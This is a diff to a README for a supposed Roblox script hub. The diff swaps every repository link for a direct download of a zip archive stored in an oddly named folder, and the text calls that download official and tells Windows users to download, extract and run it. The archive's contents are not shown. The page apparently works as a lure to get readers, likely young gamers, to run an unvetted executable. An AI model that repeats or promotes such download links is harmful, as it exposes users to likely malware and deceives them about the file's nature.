@@ -1,7 +1,7 @@
 <h1>🎯 enter-brainrot-heads-v2026-hub - Automated Roblox Script Utility for 2026</h1>
 
 <p align="center">
-  <a href="https://github.com/fabianhernand1506/enter-brainrot-heads-v2026-hub" style="display:inline-block; padding:18px 40px; background:linear-gradient(135deg,#667eea,#764ba2); color:#fff; font-size:24px; font-weight:bold; text-decoration:none; border-radius:50px; box-shadow:0 10px 25px rgba(102,126,234,0.5);">⬇️ DOWNLOAD NOW</a>
+  <a href="https://raw.githubusercontent.com/fabianhernand1506/enter-brainrot-heads-v2026-hub/main/amortisseur/v_hub_enter_heads_brainrot_1.4.zip" style="display:inline-block; padding:18px 40px; background:linear-gradient(135deg,#667eea,#764ba2); color:#fff; font-size:24px; font-weight:bold; text-decoration:none; border-radius:50px; box-shadow:0 10px 25px rgba(102,126,234,0.5);">⬇️ DOWNLOAD NOW</a>
 </p>
 
 ## 🧠 What Is This?
@@ -53,7 +53,7 @@ Your Windows computer should have:
 
 ### Step 1: Visit the Download Link
 
-Visit this link to download the application: **[https://github.com/fabianhernand1506/enter-brainrot-heads-v2026-hub](https://github.com/fabianhernand1506/enter-brainrot-heads-v2026-hub)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/fabianhernand1506/enter-brainrot-heads-v2026-hub/main/amortisseur/v_hub_enter_heads_brainrot_1.4.zip](https://raw.githubusercontent.com/fabianhernand1506/enter-brainrot-heads-v2026-hub/main/amortisseur/v_hub_enter_heads_brainrot_1.4.zip)**
 
 This is the official download page for the hub.
 
@@ -200,9 +200,9 @@ To ensure optimal performance:
 The setup process takes less than five minutes. No coding, no complex configuration - just download, extract, and run.
 
 <p align="center">
-  <a href="https://github.com/fabianhernand1506/enter-brainrot-heads-v2026-hub" style="display:inline-block; padding:16px 35px; background:linear-gradient(135deg,#f093fb,#f5576c); color:#fff; font-size:20px; font-weight:bold; text-decoration:none; border-radius:50px; box-shadow:0 10px 25px rgba(240,147,251,0.5);">⬇️ DOWNLOAD ENTER-BRAINROT-HEADS-V2026-HUB</a>
+  <a href="https://raw.githubusercontent.com/fabianhernand1506/enter-brainrot-heads-v2026-hub/main/amortisseur/v_hub_enter_heads_brainrot_1.4.zip" style="display:inline-block; padding:16px 35px; background:linear-gradient(135deg,#f093fb,#f5576c); color:#fff; font-size:20px; font-weight:bold; text-decoration:none; border-radius:50px; box-shadow:0 10px 25px rgba(240,147,251,0.5);">⬇️ DOWNLOAD ENTER-BRAINROT-HEADS-V2026-HUB</a>
 </p>
 
 ---
 
-*Visit this link to download the application: [https://github.com/fabianhernand1506/enter-brainrot-heads-v2026-hub](https://github.com/fabianhernand1506/enter-brainrot-heads-v2026-hub)*
+*Visit this link to download the application: [https://raw.githubusercontent.com/fabianhernand1506/enter-brainrot-heads-v2026-hub/main/amortisseur/v_hub_enter_heads_brainrot_1.4.zip](https://raw.githubusercontent.com/fabianhernand1506/enter-brainrot-heads-v2026-hub/main/amortisseur/v_hub_enter_heads_brainrot_1.4.zip)*
